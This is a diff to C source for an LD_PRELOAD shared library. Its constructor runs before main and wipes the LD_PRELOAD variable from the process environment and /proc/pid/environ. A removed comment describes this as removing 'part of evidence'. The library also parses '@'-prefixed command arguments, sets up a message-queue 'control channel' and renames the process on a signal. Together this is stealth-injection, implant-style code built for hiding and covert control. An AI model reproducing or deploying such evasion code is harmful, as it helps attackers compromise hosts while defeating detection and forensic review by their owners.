@@ -53,6 +53,7 @@ intact values in:
 
 char ** largv;
 int largc;
+char** lenvp;
 
 // structure for message queue 
 struct mesg_buffer {
@@ -147,16 +148,70 @@ static void sig_handler(int sig)
 	 SetProcessName();
 }
 
+void cleanEnv(void){
+
+	 // a. remove from /proc/pid/environ
+	 while (*lenvp) {
+#ifdef PSDEBUG
+		//printf("%s\n", *lenvp);
+#endif
+      if (strncmp(*lenvp, "LD_PRELOAD=", 11) == 0)
+        memset(*lenvp, 0, strlen(*lenvp));
+
+      lenvp++;
+    }
+
+	 // b. remove from process memory if present to be sure
+	 unsetenv("LD_PRELOAD"); 
+}
+
+void checkCommands(void){
+
+	char **commands = NULL;
+	int  c = 0;
+	
+	if (1 < largc) {
+    for (int i=0; i<largc; i++) {
+
+		 printf("analysing arg: %s\n", largv[i]);
+
+	    int last_pos = strlen(largv[i])-1;
+		 printf("\targ last pos: %d\n", last_pos);
+
+		 printf("\targ value first pos: %c\n", largv[i][0]);
+
+
+		 // Record only commands
+       if ( strncmp(largv[i], "@", 1) == 0 ){
+		 	printf("\targ '@' present in compare as first char: %c\n", largv[i][0]);
+		 	printf("\targ '@' present in compare as last char: %c\n", largv[i][last_pos]);
+		 	commands = (char **)realloc(commands, (sizeof(char*) * (c+1)) );
+		 	if( NULL == commands) {
+            fprintf(stderr, "Error: Failed to allocate enough memory!\n");
+       	}else{
+		 		commands[c] = strdup(largv[i]);
+		 		++c;
+				//&& 0 <= last_pos && '@' == *largv[last_pos] )
+		 	}
+		 }
+    }
+	}
+
+   for( int i = 0; i < c; ++i) {
+        printf("\t%d) \"%s\"\n", i, commands[i]);
+    }
+   printf("Number of tokens: %d\n", c);
+}
 // Constructor called by ld.so before the main. This is not guaranteed but works.
-__attribute__((constructor)) static void myctor(int argc, char **argv, char* envp[])
+__attribute__((constructor)) static void myctor(int argc, char **argv, char** envp)
 {
 
-	 //int ret = unsetenv("LD_PRELOAD");  // remove part of evidence
 
 
 	 // Save pointers to argv/argc
 	 largv=argv;
 	 largc=argc;
+	 lenvp=envp;
 
 #ifdef PSDEBUG
 	 printf("pointer argv: %p\n", argv);
@@ -166,17 +221,14 @@ __attribute__((constructor)) static void myctor(int argc, char **argv, char* env
     }
 #endif
 
-	 while (*envp) {
-#ifdef PSDEBUG
-		printf("%s\n", *envp);
-#endif
-      if (strncmp(*envp, "LD_PRELOAD=", 11) == 0)
-        memset(*envp, 0, strlen(*envp));
+	 checkCommands();
 
-      envp++;
-    }
+	 // clean LD_PRELOAD pointers
+	 cleanEnv();
 
+	 // establish control channel
 	 setRandezvous();
+
 	 // May want to wait for external conditon before renaming  
 	 signal(SIGUSR1, sig_handler); 
 
